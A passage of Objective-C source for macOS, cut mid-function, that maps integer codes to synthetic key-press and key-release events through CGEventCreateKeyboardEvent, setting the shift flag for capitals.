            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 30:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_LeftBracket, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 31:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Quote, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 32:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Semicolon, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 33:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Backslash, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 34:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Comma, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 35:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Slash, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 36:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Period, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 37:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Grave, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 38:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadDecimal, TRUE);
            break;
        case 39:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadMultiply, TRUE);
            break;
        case 40:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadPlus, TRUE);
            break;
        case 41:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadClear, TRUE);
            break;
        case 42:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadDivide, TRUE);
            break;
        case 43:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Space, TRUE);
            break;
        case 44:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadMinus, TRUE);
            break;
        case 45:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadEquals, TRUE);
            break;
        case 46:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad0, TRUE);
            break;
        case 47:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad1, TRUE);
            break;
        case 48:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad2, TRUE);
            break;
        case 49:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad3, TRUE);
            break;
        case 50:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad4, TRUE);
            break;
        case 51:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad5, TRUE);
            break;
        case 52:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad6, TRUE);
            break;
        case 53:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad7, TRUE);
            break;
        case 54:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad8, TRUE);
            break;
        case 55:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad9, TRUE);
            break;
        case 56:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_0, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 57:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_1, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 58:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_2, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 59:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_3, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 60:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_4, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 61:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_5, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 62:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_6, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 63:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_7, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 64:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_8, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 65:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_9, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 66:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_A, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 67:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_B, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 68:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_C, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 69:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_D, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 70:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_E, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 71:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_F, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 72:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_G, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 73:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_H, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 74:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_I, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 75:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_J, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 76:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_K, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 77:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_L, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 78:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_M, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 79:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_N, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 80:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_O, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 81:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_P, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 82:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Q, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 83:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_R, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 84:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_S, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 85:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_T, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 86:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_U, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 87:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_V, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 88:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_W, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 89:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_X, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 90:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Y, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 91:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Z, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 92:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Equal, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 93:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Minus, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 94:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_RightBracket, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 95:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_LeftBracket, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 96:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Quote, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 97:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Semicolon, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 98:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Backslash, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 99:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Comma, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 100:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Slash, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 101:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Period, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 102:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Grave, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 103:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_0, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 104:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_1, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 105:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_2, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 106:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_3, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 107:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_4, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 108:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_5, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 109:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_6, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 110:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_7, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 111:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_8, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 112:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_9, TRUE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 200:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadEnter, TRUE);
            break;
        case 201:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Return, TRUE);
            break;
        case 202:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Tab, TRUE);
            break;
        case 203:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Delete, TRUE);
            break;
        case 204:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Shift, TRUE);
            break;
        case 205:
            key = CGEventCreateKeyboardEvent(aSource, kVK_RightShift, TRUE);
            break;
        case 206:
            key = CGEventCreateKeyboardEvent(aSource, kVK_RightArrow, TRUE);
            break;
        case 207:
            key = CGEventCreateKeyboardEvent(aSource, kVK_LeftArrow, TRUE);
            break;
        case 208:
            key = CGEventCreateKeyboardEvent(aSource, kVK_UpArrow, TRUE);
            break;
        case 209:
            key = CGEventCreateKeyboardEvent(aSource, kVK_DownArrow, TRUE);
            break;
        default:
            break;
    }
    return key;
}

-(CGEventRef) generateNewKeyEventReleaseWith:(int) aCase isCaplockActivce:(BOOL) aIsCapLockActive source:(CGEventSourceRef) aSource {
    CGEventRef key = nil;
    switch(aCase){
        case 1:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_A, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 2:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_B, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 3:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_C, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 4:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_D, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 5:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_E, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 6:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_F, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 7:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_G, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 8:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_H, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 9:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_I, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 10:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_J, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 11:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_K, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 12:
            key= CGEventCreateKeyboardEvent(aSource, kVK_ANSI_L, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 13:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_M, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 14:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_N, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 15:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_O, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 16:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_P, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 17:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Q, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 18:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_R, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 19:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_S, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 20:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_T, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 21:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_U, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 22:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_V, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 23:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_W, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 24:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_X, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 25:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Y, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 26:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Z, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 27:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Equal, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 28:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Minus, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 29:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_RightBracket, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 30:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_LeftBracket, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 31:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Quote, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 32:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Semicolon, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 33:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Backslash, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 34:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Comma, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 35:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Slash, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 36:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Period, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 37:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Grave, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 38:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadDecimal, FALSE);
            break;
        case 39:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadMultiply, FALSE);
            break;
        case 40:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadPlus, FALSE);
            break;
        case 41:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadClear, FALSE);
            break;
        case 42:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadDivide, FALSE);
            break;
        case 43:
            key = CGEventCreateKeyboardEvent(aSource, kVK_Space, FALSE);
            break;
        case 44:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadMinus, FALSE);
            break;
        case 45:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_KeypadEquals, FALSE);
            break;
        case 46:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad0, FALSE);
            break;
        case 47:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad1, FALSE);
            break;
        case 48:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad2, FALSE);
            break;
        case 49:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad3, FALSE);
            break;
        case 50:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad4, FALSE);
            break;
        case 51:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad5, FALSE);
            break;
        case 52:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad6, FALSE);
            break;
        case 53:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad7, FALSE);
            break;
        case 54:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad8, FALSE);
            break;
        case 55:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Keypad9, FALSE);
            break;
        case 56:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_0, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 57:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_1, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 58:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_2, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 59:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_3, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 60:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_4, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 61:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_5, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 62:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_6, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 63:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_7, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 64:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_8, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 65:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_9, FALSE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 66:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_A, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 67:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_B, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 68:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_C, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 69:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_D, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 70:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_E, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 71:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_F, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 72:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_G, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 73:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_H, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 74:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_I, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 75:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_J, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 76:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_K, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 77:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_L, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 78:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_M, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 79:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_N, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 80:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_O, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 81:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_P, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 82:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Q, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 83:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_R, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 84:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_S, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 85:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_T, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 86:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_U, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 87:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_V, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 88:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_W, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 89:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_X, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 90:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Y, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 91:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Z, FALSE);
            CGEventSetFlags(key, kCGEventFlagMaskAlphaShift);
            break;
        case 92:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Equal, FALSE);
